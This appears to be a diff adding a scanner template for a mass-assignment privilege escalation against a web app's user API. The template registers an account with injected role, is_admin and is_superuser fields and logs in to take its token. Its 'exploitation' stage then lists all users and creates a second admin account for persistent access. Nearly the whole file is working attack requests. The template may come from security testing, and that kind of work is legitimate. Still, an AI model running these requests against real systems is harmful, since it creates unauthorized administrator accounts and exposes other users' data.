@@ -1,0 +1,87 @@
+id: mass-assignment-god
+name: Mass Assignment – God Level (Role, Admin, is_superuser)
+severity: critical
+impact: Attacker can create admin accounts and escalate privileges.
+chain: Combine with BOLA to access all users.
+
+requests:
+  # 1. Register with admin role
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/Users"
+      - "{{BaseURL}}/api/register"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "email": "admin{{random}}@evil.com",
+        "password": "Admin123!",
+        "passwordRepeat": "Admin123!",
+        "role": "admin",
+        "is_admin": true,
+        "is_superuser": true,
+        "permissions": ["*"]
+      }
+    matchers:
+      - type: status
+        status: 201
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"id":'
+    extractors:
+      - type: json
+        name: admin_id
+        json:
+          - "$.data.id"
+          - "$.id"
+
+verification:
+  # Login with the newly created admin account
+  - method: POST
+    path: "{{BaseURL}}/rest/user/login"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"email": "admin{{random}}@evil.com", "password": "Admin123!"}
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+    extractors:
+      - type: json
+        name: jwt_token
+        json:
+          - "$.authentication.token"
+          - "$.token"
+
+exploitation:
+  # List all users using the admin token
+  - method: GET
+    path: "{{BaseURL}}/api/Users"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    extract:
+      type: status
+      expected: 200
+  # Create another admin account to confirm persistent access
+  - method: POST
+    path: "{{BaseURL}}/api/Users"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+      Content-Type: application/json
+    body: |
+      {
+        "email": "admin2@evil.com",
+        "password": "Admin123!",
+        "role": "admin"
+      }
+    extract:
+      type: status
+      expected: 201
